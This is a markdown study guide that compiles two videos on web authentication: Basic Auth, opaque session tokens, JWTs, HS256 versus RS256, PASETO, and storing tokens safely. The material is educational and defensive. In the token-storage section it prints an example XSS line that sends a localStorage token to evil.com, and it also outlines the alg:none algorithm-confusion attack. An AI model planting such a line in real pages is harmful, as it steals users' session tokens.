# Auth Token Compilation: The Complete Picture

> Two videos, one topic — but very different angles. The first explains **how** Basic Auth, Bearer tokens, and JWTs work. The second argues **JWTs are over-adopted** and shouldn't be your default session mechanism. Together, they give a far more honest picture than either does alone.

---

## The Foundation: HTTP is Stateless

```
HTTP doesn't remember you. Every request is a blank slate.

Like a drive-thru: you order, get food, window closes.
Next car? They have no idea who you are. By design.

This means: prove your identity on EVERY request.
Authentication mechanisms are how you solve this.
```

**Authentication vs Authorization** — don't conflate them:

```
Authentication (AuthN)  →  "Who are you?"      — identity
Authorization  (AuthZ)  →  "What can you do?"  — permissions

Auth is the gatekeeper. Authz is the rule book. Both are needed. Neither replaces the other.
```

---

## The Token Taxonomy

Before diving into mechanisms, understand the two axes that define every token system:

```mermaid
mindmap
  root((Session Token Types))
    Stateful
      Data lives on the SERVER
      Token is just a random ID
      Server looks up ID in DB or cache
      Server can revoke or update anytime
      Called opaque session tokens
      Examples: Express sessions, Rails sessions
    Stateless
      Data lives IN the TOKEN
      Server stores nothing
      Verify via signature math no DB hit
      Cannot revoke until expiry
      Examples: JWT, PASETO
        JWT transparent payload readable
        PASETO opaque payload encrypted
```

> **"Stateless" here describes the server** — it holds no state for you. The token is self-contained. This is both the superpower and the Achilles heel of JWTs.

---

## Mechanism 1: Basic Authentication

The simplest scheme. Credentials Base64-encoded and sent with **every** request.

```
Client encodes:
  "madhu:secret123"  →  Base64  →  "bWFkaHU6c2VjcmV0MTIz"

Sent with every request:
  Authorization: Basic bWFkaHU6c2VjcmV0MTIz

Server decodes:
  "bWFkaHU6c2VjcmV0MTIz"  →  "madhu:secret123"  →  validate ✅ or ❌
```

!!! warning "Base64 is NOT encryption"
    It's encoding — a format transformation so HTTP headers can carry binary-safe characters.
    Anyone can reverse it in milliseconds. Over plain HTTP, you're broadcasting your password in cleartext.
    **Basic Auth is only acceptable over HTTPS.**

### Pros / Cons / When

| ✅ Use it when | ❌ Avoid it when |
|---------------|----------------|
| Internal tools, local dev | Public-facing APIs |
| Machine-to-machine (you own both ends) | Credentials could appear in proxy/server logs |
| Simplicity is more valuable than security hardening | You need revocation or token expiry |

---

## Mechanism 2: Opaque Bearer Tokens (Stateful Sessions)

The client authenticates once; the server issues a random token and stores it. All future requests carry that token — the server looks it up in the database.

```
Step 1 — Login:
  Client  ──── POST /login { email, password } ────▶  Server
  Server validates → generates random token → stores in DB
  Client  ◀─── { token: "a3f8c2d9e1b7..." } ─────────  Server

Step 2 — Every request:
  Client  ──── GET /api/me ─────────────────────────▶  Server
               Authorization: Bearer a3f8c2d9e1b7...
               Server: SELECT user FROM sessions WHERE token = ?  ← DB hit
  Client  ◀─── 200 OK { ... } ──────────────────────   Server
```

**Why it's "opaque":** the token string itself carries zero information. Without the DB, it's meaningless — just a random key to a lock only the server holds.

### The Scaling Problem

```
Single server — trivial:
  Server A  ────  checks  ────▶  DB

Multiple servers — requires shared state:
  Server A  ──┐
  Server B  ──┼──  all check  ──▶  Redis / shared DB
  Server C  ──┘
  
  Without a shared store, Server B doesn't know about Server A's tokens.
  Solution: centralized session cache (Redis is common). Adds infrastructure, but it works.
```

### Why b.txt Argues This Is the Right Default

> *"In almost all cases, there is no need to store user data on the token. You can make use of caching to fetch user data efficiently. The data in a JWT cannot even be updated after creation, so in a lot of cases stateless tokens end up making database calls to retrieve user data anyway."*

The opaque session token is:

- **Smaller** — just a random string, not a full JWT with headers and claims
- **Revocable instantly** — delete it from the DB
- **Updatable** — change permissions server-side without touching the client
- **Simpler** — no signing, no algorithm selection, no library vulnerabilities
- **No worse in practice** — if your system needs a DB call anyway to fetch fresh user data, you've gained nothing from JWT's statelessness

---

## Mechanism 3: JWT — JSON Web Tokens

### The Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header   (Base64url)
.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzA0MDY3MjAwfQ  ← Payload  (Base64url)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature (cryptographic hash)
```

**Header** — metadata, most importantly the algorithm:
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload** — claims (data about the user):
```json
{
  "sub":  "user_42",       ← subject (user ID)
  "role": "admin",
  "exp":  1704067200,      ← expiry (Unix timestamp) — CRITICAL
  "iat":  1704063600       ← issued at
}
```

Registered claims: `sub`, `exp`, `iat`, `iss` (issuer), `aud` (audience)
Custom claims: anything you need — `role`, `org_id`, `permissions`

**Signature** — tamper protection:
```
HMAC_SHA256(base64url(header) + "." + base64url(payload), secret_key)
```

### The Critical Distinction: Tamperproof ≠ Private

!!! danger "The Most Misunderstood JWT Property"
    The payload is **only Base64-encoded**. Go to jwt.io right now, paste any JWT — you'll see everything inside. **Anyone can read your JWT payload.**

    The **signature** prevents modification — change even one character in the payload and the signature won't match. But it does nothing to hide the data.

```
✅  Tamperproof:  you cannot alter claims without invalidating the signature
❌  NOT private:  anyone can decode and read the payload

NEVER put in JWT payload:  passwords, SSNs, credit card numbers, secrets
Safe to put:               user_id, role, email, subscription tier
```

### The Stateless Advantage

```
Opaque token verification:           JWT verification:
  1. Receive token                     1. Receive token
  2. Query DB: "who owns this?"        2. Recompute signature from header + payload
  3. DB responds with user data        3. Compare with received signature — pure math
  4. Continue                          4. Check exp timestamp
                                       5. Continue
  
  Network + DB round-trip              No network. No DB. ~5–10× faster.
  Shared store required for scale      Any server verifies independently
```

### The Revocation Problem — The Core Weakness

This is where a.txt and b.txt converge most forcefully.

```
Opaque token revocation:   trivial
  DELETE FROM sessions WHERE token = 'a3f8c2d9...'
  Instant. Done. Token is dead. ✅

JWT revocation:   hard
  The server holds no record of the token.
  A stolen JWT is valid until it expires — period.
  
  Options and their trade-offs:
  ┌──────────────────────────────┬──────────────────────────────────────────┐
  │ Token blacklist in DB/Redis  │ Works, but re-introduces server state    │
  │                              │ Defeats the stateless advantage entirely  │
  ├──────────────────────────────┼──────────────────────────────────────────┤
  │ Short-lived access tokens    │ ✅ Limits damage window (15 min)         │
  │ + revocable refresh tokens   │ Best practical compromise                │
  ├──────────────────────────────┼──────────────────────────────────────────┤
  │ Token versioning             │ Store version on user record             │
  │                              │ One DB read per request ← back to square │
  └──────────────────────────────┴──────────────────────────────────────────┘
```

!!! example "Real-World Consequence: The Linus Tech Tips Hack (2023)"
    In March 2023, an employee at Linus Media Group opened a malicious `.exe` file. It copied active browser session tokens — including YouTube session cookies — to the attacker's machine.

    The attacker used those tokens to hijack three large YouTube channels and run a crypto scam. Here's what made it worse: **even after the company regained access, they couldn't immediately revoke the attacker's sessions** because the session state was in the token, not fully server-controlled in a way that let them force-invalidate all active sessions instantly.

    > *"I'm fairly sure this particular issue wasn't caused by JWTs, but it is a great example of the kind of vulnerability you open yourself up to when using them as a session token."* — b.txt

    **The lesson:** when a stateless token is stolen, you are at its mercy until it expires. There is no kill switch.

---

## JWT Signing: HS256 vs RS256

```
HS256 — Symmetric (one shared secret)
──────────────────────────────────────
Think: house key. Same key locks AND unlocks.

  Auth service:    HMAC_SHA256(payload, secret)  ← sign
  Any service:     HMAC_SHA256(payload, secret)  ← verify (needs the same secret!)

  ✅ Fast, simple
  ✅ Perfect when you own and control all services
  ❌ Every verifying service must possess the secret
  ❌ Secret must be distributed securely across all services


RS256 — Asymmetric (public/private key pair)
──────────────────────────────────────────────
Think: mailbox. Private key = you can put mail in. Public key = anyone can check.

  Auth service:    RSA_sign(payload, private_key)     ← sign (private key never leaves auth)
  Other services:  RSA_verify(payload, public_key)    ← verify (public key safe to share widely)

  ✅ Private key stays in one place — never distributed
  ✅ Public key published openly (e.g. /.well-known/jwks.json)
  ✅ Ideal for microservices or when external parties verify your tokens
  ❌ Slower than HS256
  ❌ More complex key management


When to choose:
  HS256  →  monolith, small app, you control all consumers of the token
  RS256  →  microservices, central identity provider, external token consumers
```

---

## The JWT Over-Adoption Problem

> b.txt's central argument: **JWTs are excellent for one-time cross-service authentication. They're poor as ongoing session tokens. We use them for sessions because statelessness is convenient, not because it's correct.**

```
The appeal:
  "No DB call on every request → fast!"
  "Scales horizontally without shared state!"
  These are real advantages — in the right context.

The reality for most apps:
  Your endpoints need fresh user data anyway  → you're making DB calls regardless
  JWT payload is stale the moment it's issued → roles/permissions can't be updated mid-session
  When something goes wrong, you can't revoke  → bad actor stays in until expiry
  The token is large → sent on every request → more bandwidth than a short opaque string
```

### The Three JWT Criticisms (and Their Validity)

| Criticism | Validity | Context |
|-----------|----------|---------|
| **Library implementation bugs** (alg:none, etc.) | Moderate | Bugs happen in all crypto. Libraries are patched. Whitelist algorithms explicitly. |
| **Overkill / overused** | Valid | JWTs are complex tokens chosen out of habit. Opaque sessions are simpler and sufficient for most single server-client apps. |
| **Cannot revoke** | **Most valid** | This is a fundamental design property, not a bug. If you need revocation, you need server state — at which point, use a stateful token. |

---

## The Use-Case Matrix: What to Actually Use

```mermaid
mindmap
  root((What Token to Use))
    Single server, single client
      Opaque session token
      Random string stored in DB
      Revocable instantly
      Smaller than JWT
      Simpler implementation
      Default choice for most web apps
    Cross-service you own all services
      Symmetric stateless token HS256
      Shared secret between your services
      USE ONCE ONLY
      Server accepts token then creates its own opaque session
      Never reuse for ongoing communication
    Cross-service external service
      Asymmetric stateless token RS256 or JWT
      Issuer holds private key
      Recipient verifies with public key
      USE ONCE ONLY
      Same revocation caveats apply
    Need ongoing stateless sessions
      Access token short-lived 15 min JWT
      Refresh token long-lived opaque in DB
      Best practical compromise
      Scales AND can be revoked via refresh token
```

### The Cross-Service One-Time Pattern (b.txt's Key Insight)

```
Stateless tokens should really only be used ONCE.

Flow (service A → service B):
  1. Client has active opaque session with Service A
  2. Client needs to talk to Service B
  3. Service A issues a short-lived signed JWT: "this client is allowed to talk to B"
  4. Client makes ONE request to Service B with that JWT
  5. Service B verifies signature, creates its OWN opaque session for the client
  6. Client now uses that opaque session for all subsequent calls to B
  7. The original JWT is no longer accepted (even if not expired)

Why this works:
  JWT used for its strength — portable, cryptographically verifiable, no shared state
  Opaque session used for its strength — revocable, updatable, server-authoritative
  Neither is misused for what it's bad at
```

---

## PASETO — The Alternative Worth Knowing

> b.txt mentions PASETO (Platform-Agnostic Security Tokens) as an alternative to JWT.

```
JWT problems PASETO addresses:
  ✅ No algorithm agility — algorithm is part of the token version, not configurable
     (eliminates the alg:none and algorithm confusion attacks entirely)
  ✅ Payload is ENCRYPTED (not just encoded) — truly opaque to clients
  ✅ Simpler spec, fewer footguns

Flavours:
  v3.local  — symmetric encryption (AES-256-CTR + HMAC-SHA384) → like HS256 but encrypted
  v4.public — asymmetric signing (Ed25519) → like RS256 but cleaner

  local = encrypted (nobody reads the payload without the key)
  public = signed (anyone with the public key can verify, but can still read)

JWT equivalent:
  JWT  = signed, payload readable by anyone (just Base64)
  PASETO local = encrypted, payload readable only with the key

Use PASETO if:
  You're starting a new project and want fewer JWT footguns
  You need the payload to genuinely be private (not just "don't look")
```

---

## Security Mistakes — Consolidated

### 1. Never send auth tokens over plain HTTP

```
Basic, Bearer, JWT — all meaningless without TLS.
HTTPS encrypts the entire request including the Authorization header.
No exceptions. Ever.
```

### 2. Token storage: localStorage vs HttpOnly Cookie

```
localStorage:
  ✅ Simple, persists across tabs
  ❌ JavaScript-readable → XSS can steal tokens:
     fetch("https://evil.com?token=" + localStorage.getItem("token"))

HttpOnly Cookie:
  ✅ JavaScript cannot read it (document.cookie won't show HttpOnly cookies)
  ✅ Automatically sent with same-origin requests
  ❌ Sent on cross-site requests → CSRF vulnerability
  Fix: SameSite=Strict or SameSite=Lax + CSRF token for state-changing requests
```

| | localStorage | HttpOnly Cookie |
|-|-------------|-----------------|
| XSS risk | ❌ High | ✅ Protected |
| CSRF risk | ✅ None (manual header) | ❌ Auto-sent |
| CSRF mitigation | N/A | `SameSite=Strict` / CSRF token |
| Recommendation | Avoid for auth | ✅ Preferred |

### 3. Set short expiry times

```
Access token:   15 minutes  — minimises the stolen-token damage window
Refresh token:  7–30 days   — stored in DB, can be revoked anytime
Never:          1 year JWT  — stolen token valid for a year
```

### 4. Never roll your own crypto

```
Use: jsonwebtoken (Node), PyJWT (Python), golang-jwt/jwt (Go)
These have been audited. Your implementation almost certainly has timing attack vulnerabilities.
```

### 5. Algorithm confusion attack — whitelist explicitly

```
Attack: attacker changes { "alg": "none" } or switches RS256 → HS256 in the header.
        Naive servers skip signature validation entirely.

Fix (always explicitly whitelist accepted algorithms):

  # Python
  jwt.decode(token, secret, algorithms=["HS256"])

  # Node.js
  jwt.verify(token, secret, { algorithms: ["HS256"] })

  Never let the token choose its own algorithm.
```

---

## Decision Framework — Synthesised

```
Is this internal tooling / local dev / M2M where you own both ends?
  → Basic Auth over HTTPS. Zero overhead, zero complexity.

Is this a single-server, single-client web app?
  → Opaque session token. Simpler, smaller, instantly revocable.
     Don't reach for JWT just because it's popular.

Do you need to scale horizontally across many servers?
  → JWT with short expiry (15 min) + opaque refresh token in Redis/DB.
     Stateless for speed, refresh token for revocation control.

Do your services need to talk to each other (services you own)?
  → HS256 JWT, used ONCE as a handshake. Each service then creates its own session.

Does an external service need to verify your tokens (or you theirs)?
  → RS256 JWT or PASETO public. Public key published. Use once, then switch to session.

Do you absolutely require an unrevocable ongoing stateless session?
  → JWT. But understand the trade-off — stolen token = valid until expiry.
     The Linus scenario is your risk model.
```

---

## The Mental Model: One Sentence Each

```
Basic Auth      →  Password on every request. Only for internal/dev + HTTPS.

Opaque Token    →  Random key the server maps to you. Revocable, simple. Default choice.

JWT             →  Self-describing signed ticket. Fast to verify, hard to revoke.
                   Use for cross-service handshakes — not as your primary session token.

PASETO          →  JWT done better. No algorithm footguns. Payload actually encrypted.

HS256           →  One secret, signs and verifies. Monolith or trusted internal services.

RS256           →  Private key signs, public key verifies. Microservices, external parties.

Refresh token   →  The opaque lifeline that makes JWT revocable. Lives in the DB.

HttpOnly cookie →  The right place to store a session token in a browser.
```
